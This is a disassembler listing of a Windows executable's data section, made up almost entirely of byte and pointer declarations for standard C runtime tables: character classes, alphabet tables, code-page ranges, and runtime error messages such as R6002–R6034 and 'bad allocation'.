                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db  10h
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db  20h
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
byte_4254E8     db 0                    ; DATA XREF: sub_411C24+11E↑w
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  61h ; a
                db  62h ; b
                db  63h ; c
                db  64h ; d
                db  65h ; e
                db  66h ; f
                db  67h ; g
                db  68h ; h
                db  69h ; i
                db  6Ah ; j
                db  6Bh ; k
                db  6Ch ; l
                db  6Dh ; m
                db  6Eh ; n
                db  6Fh ; o
                db  70h ; p
                db  71h ; q
                db  72h ; r
                db  73h ; s
                db  74h ; t
                db  75h ; u
                db  76h ; v
                db  77h ; w
                db  78h ; x
                db  79h ; y
                db  7Ah ; z
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  41h ; A
                db  42h ; B
                db  43h ; C
                db  44h ; D
                db  45h ; E
                db  46h ; F
                db  47h ; G
                db  48h ; H
                db  49h ; I
                db  4Ah ; J
                db  4Bh ; K
                db  4Ch ; L
                db  4Dh ; M
                db  4Eh ; N
                db  4Fh ; O
                db  50h ; P
                db  51h ; Q
                db  52h ; R
                db  53h ; S
                db  54h ; T
                db  55h ; U
                db  56h ; V
                db  57h ; W
                db  58h ; X
                db  59h ; Y
                db  5Ah ; Z
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
; volatile LONG *lpAddend
lpAddend        dd offset unk_4251C0    ; DATA XREF: sub_40E461+45↑r
                                        ; sub_41191F+4C↑r ...
byte_4255EC     db 1                    ; DATA XREF: sub_411A3F+113↑r
                db    2
                db    4
                db    8
dword_4255F0    dd 3A4h                 ; DATA XREF: sub_411A3F:loc_411A7D↑r
unk_4255F4      db  60h ; `             ; DATA XREF: sub_411A3F+15B↑o
                db  82h ; ‚
                db  79h ; y
                db  82h ; ‚
                db  21h ; !
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
unk_425600      db 0A6h ; ¦             ; DATA XREF: sub_411A3F+F6↑o
                db 0DFh ; ß
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db 0A1h ; ¡
                db 0A5h ; ¥
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  81h
                db  9Fh ; Ÿ
                db 0E0h ; à
                db 0FCh ; ü
                db    0
                db    0
                db    0
                db    0
                db  40h ; @
                db  7Eh ; ~
                db  80h ; €
                db 0FCh ; ü
                db    0
                db    0
                db    0
                db    0
                db 0A8h ; ¨
                db    3
                db    0
                db    0
                db 0C1h ; Á
                db 0A3h ; £
                db 0DAh ; Ú
                db 0A3h ; £
                db  20h
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  81h
                db 0FEh ; þ
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  40h ; @
                db 0FEh ; þ
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db 0B5h ; µ
                db    3
                db    0
                db    0
                db 0C1h ; Á
                db 0A3h ; £
                db 0DAh ; Ú
                db 0A3h ; £
                db  20h
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  81h
                db 0FEh ; þ
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  41h ; A
                db 0FEh ; þ
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db 0B6h ; ¶
                db    3
                db    0
                db    0
                db 0CFh ; Ï
                db 0A2h ; ¢
                db 0E4h ; ä
                db 0A2h ; ¢
                db  1Ah
                db    0
                db 0E5h ; å
                db 0A2h ; ¢
                db 0E8h ; è
                db 0A2h ; ¢
                db  5Bh ; [
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  81h
                db 0FEh ; þ
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  40h ; @
                db  7Eh ; ~
                db 0A1h ; ¡
                db 0FEh ; þ
                db    0
                db    0
                db    0
                db    0
                db  51h ; Q
                db    5
                db    0
                db    0
                db  51h ; Q
                db 0DAh ; Ú
                db  5Eh ; ^
                db 0DAh ; Ú
                db  20h
                db    0
                db  5Fh ; _
                db 0DAh ; Ú
                db  6Ah ; j
                db 0DAh ; Ú
                db  32h ; 2
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  81h
                db 0D3h ; Ó
                db 0D8h ; Ø
                db 0DEh ; Þ
                db 0E0h ; à
                db 0F9h ; ù
                db    0
                db    0
                db  31h ; 1
                db  7Eh ; ~
                db  81h
                db 0FEh ; þ
                db    0
                db    0
                db    0
                db    0
                dd offset aHH           ; "        h((((                  H"
dword_4256E4    dd 0FFFFFFFEh           ; DATA XREF: sub_40E461+30↑r
                                        ; sub_40E461+50↑r ...
unk_4256E8      db  43h ; C             ; DATA XREF: sub_411DDC:loc_411EE0↑o
                                        ; sub_411F25:loc_411F77↑o ...
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
unk_4256F0      db    1                 ; DATA XREF: sub_41204D+28↑o
                                        ; sub_41241F+E8↑o ...
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                dd offset unk_4256E8
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                dd offset unk_4256E8
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                dd offset unk_4256E8
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                dd offset unk_4256E8
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                dd offset unk_4256E8
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    1
                db    0
                db    0
                db    0
                db    1
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                dd offset off_425ED8
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
off_4257B8      dd offset asc_420C78    ; DATA XREF: sub_40EDBB+11↑r
                                        ; sub_40EE3C+11↑r
                                        ; "         (((((                  H"
                dd offset unk_421100
                dd offset unk_421280
                dd offset off_425E18
off_4257C8      dd offset unk_4256F0    ; DATA XREF: sub_40E461+28↑r
                                        ; sub_41208B+4E↑r ...
                db    1
                db    0
                db    0
                db    0
off_4257D0      dd offset unk_4256F0    ; DATA XREF: sub_412B88+19↑o
                dd offset unk_4251C0
dword_4257D8    dd 0FFFFFFFFh           ; DATA XREF: sub_412101+18↑r
                                        ; sub_41217C+18↑r ...
; DWORD dwTlsIndex
dwTlsIndex      dd 0FFFFFFFFh           ; DATA XREF: sub_412101+6↑r
                                        ; sub_412101+23↑r ...
off_4257E0      dd offset sub_412FEB    ; DATA XREF: sub_412D65+12↑r
                                        ; sub_41301F+47↑w
dword_4257E4    dd 3                    ; DATA XREF: sub_4133AD+92↑r
                                        ; sub_4133AD+B1↑r ...
dword_4257E8    dd 7                    ; DATA XREF: sub_4133AD+98↑r
                                        ; sub_4133AD+B7↑r ...
                db  78h ; x
                db    0
                db    0
                db    0
dword_4257F0    dd 0Ah                  ; DATA XREF: sub_4133AD+1A↑r
                                        ; sub_419A80+8↑r
                align 10h
off_425800      dd offset unk_42CB20    ; DATA XREF: sub_41359A↑o
                                        ; sub_4135A0+52↑o ...
                align 8
                dd offset unk_42CB20
                db    1
                db    1
                db    0
                db    0
unk_425810      db    0                 ; DATA XREF: sub_4135A0+74↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  10h
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    2
                db    0
                db    0
                db    0
                db    1
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    2
                db    0
                db    0
                db    0
                db    2
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
unk_425870      db    0                 ; DATA XREF: sub_4135A0+A4↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
unk_425A60      db    0                 ; DATA XREF: sub_413671+12↑o
                                        ; sub_4136E4+11↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
byte_425A80     db 0                    ; DATA XREF: sub_4135A0+67↑o
                                        ; sub_413E86:loc_4141F9↑r ...
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    2
                db    2
                db    2
                db    2
                db    2
                db    2
                db    2
                db    2
                db    2
                db    2
                db    2
                db    2
                db    2
                db    2
                db    2
                db    2
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
unk_425B80      db 0FFh ; ÿ             ; DATA XREF: sub_410957:loc_410A61↑o
                                        ; sub_410B61+AD↑o ...
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db  80h ; €
                db  0Ah
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  75h ; u
                db  98h ; ˜
                db    0
                db    0
                db  73h ; s
                db  98h ; ˜
                db    0
                db    0
                dd offset aBadAllocation ; "bad allocation"
                align 10h
                db  10h
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
; LPCRITICAL_SECTION lpCriticalSection
lpCriticalSection dd 0                  ; DATA XREF: sub_416797+15↑o
                                        ; sub_416797:loc_4167D6↑w ...
dword_425BDC    dd 1                    ; DATA XREF: sub_416797:loc_4167A2↑r
                db    0
                db    0
                db    0
                db    0
                db    1
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    1
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    1
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    1
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    1
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    1
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    1
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    1
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    1
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    1
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    1
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    1
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    1
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
dword_425CF8    dd 2                    ; DATA XREF: sub_4167E2+2C↑o
                                        ; sub_4167E2+4C↑o ...
off_425CFC      dd offset aR6002FloatingP
                                        ; DATA XREF: sub_41740A+13D↑r
                                        ; sub_41740A+18D↑o
                                        ; "R6002\r\n- floating point support not l"...
                db    8
                db    0
                db    0
                db    0
                dd offset aR6008NotEnough ; "R6008\r\n- not enough space for argumen"...
                db    9
                db    0
                db    0
                db    0
                dd offset aR6009NotEnough ; "R6009\r\n- not enough space for environ"...
                db  0Ah
                db    0
                db    0
                db    0
                dd offset aThisApplicatio ; "\r\nThis application has requested the "...
                db  10h
                db    0
                db    0
                db    0
                dd offset aR6016NotEnough ; "R6016\r\n- not enough space for thread "...
                db  11h
                db    0
                db    0
                db    0
                dd offset aR6017Unexpecte ; "R6017\r\n- unexpected multithread lock "...
                db  12h
                db    0
                db    0
                db    0
                dd offset aR6018Unexpecte ; "R6018\r\n- unexpected heap error\r\n"
                db  13h
                db    0
                db    0
                db    0
                dd offset aR6019UnableToO ; "R6019\r\n- unable to open console devic"...
                db  18h
                db    0
                db    0
                db    0
                dd offset aR6024NotEnough ; "R6024\r\n- not enough space for _onexit"...
                db  19h
                db    0
                db    0
                db    0
                dd offset aR6025PureVirtu ; "R6025\r\n- pure virtual function call\r"...
                db  1Ah
                db    0
                db    0
                db    0
                dd offset aR6026NotEnough ; "R6026\r\n- not enough space for stdio i"...
                db  1Bh
                db    0
                db    0
                db    0
                dd offset aR6027NotEnough ; "R6027\r\n- not enough space for lowio i"...
                db  1Ch
                db    0
                db    0
                db    0
                dd offset aR6028UnableToI ; "R6028\r\n- unable to initialize heap\r"...
                db  1Eh
                db    0
                db    0
                db    0
                dd offset aR6030CrtNotIni ; "R6030\r\n- CRT not initialized\r\n"
                db  1Fh
                db    0
                db    0
                db    0
                dd offset aR6031AttemptTo ; "R6031\r\n- Attempt to initialize the CR"...
                db  20h
                db    0
                db    0
                db    0
                dd offset aR6032NotEnough ; "R6032\r\n- not enough space for locale "...
                db  21h ; !
                db    0
                db    0
                db    0
                dd offset aR6033AttemptTo ; "R6033\r\n- Attempt to use MSIL code fro"...
                db  22h ; "
                db    0
                db    0
                db    0
                dd offset aR6034AnApplica ; "R6034\r\nAn application has made an att"...
                db  78h ; x
                db    0
                db    0
                db    0
                dd offset aDomainError  ; "DOMAIN error\r\n"
                db  79h ; y
                db    0
                db    0
                db    0
                dd offset aSingError    ; "SING error\r\n"
                db  7Ah ; z
                db    0
                db    0
                db    0
                dd offset aTlossError   ; "TLOSS error\r\n"
                db 0FCh ; ü
                db    0
                db    0
                db    0
                dd offset asc_420544    ; "\r\n"
                db 0FFh ; ÿ
                db    0
                db    0
                db    0
                dd offset aRuntimeError ; "runtime error "
                dd offset aBadAllocation ; "bad allocation"
off_425DB4      dd offset off_4202D8    ; DATA XREF: sub_4183F9+126↑o
                                        ; .rdata:00422940↑o ...
                db    0
                db    0
                db    0
                db    0
                db  2Eh ; .
                db  3Fh ; ?
                db  41h ; A
                db  56h ; V
                db  62h ; b
                db  61h ; a
                db  64h ; d
                db  5Fh ; _
                db  65h ; e
                db  78h ; x
                db  63h ; c
                db  65h ; e
                db  70h ; p
                db  74h ; t
                db  69h ; i
                db  6Fh ; o
                db  6Eh ; n
                db  40h ; @
                db  73h ; s
                db  74h ; t
                db  64h ; d
                db  40h ; @
                db  40h ; @
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
off_425DE0      dd offset sub_41C9A7    ; DATA XREF: sub_4156A4+5↑w
                                        ; sub_418B77:loc_418B7D↑o
off_425DE4      dd offset sub_41C9A7    ; DATA XREF: sub_4156A4+A↑w
off_425DE8      dd offset sub_41C9A7    ; DATA XREF: sub_4156A4+14↑w
off_425DEC      dd offset sub_41C9A7    ; DATA XREF: sub_4156A4+1E↑w
off_425DF0      dd offset sub_41C9A7    ; DATA XREF: sub_4156A4+28↑w
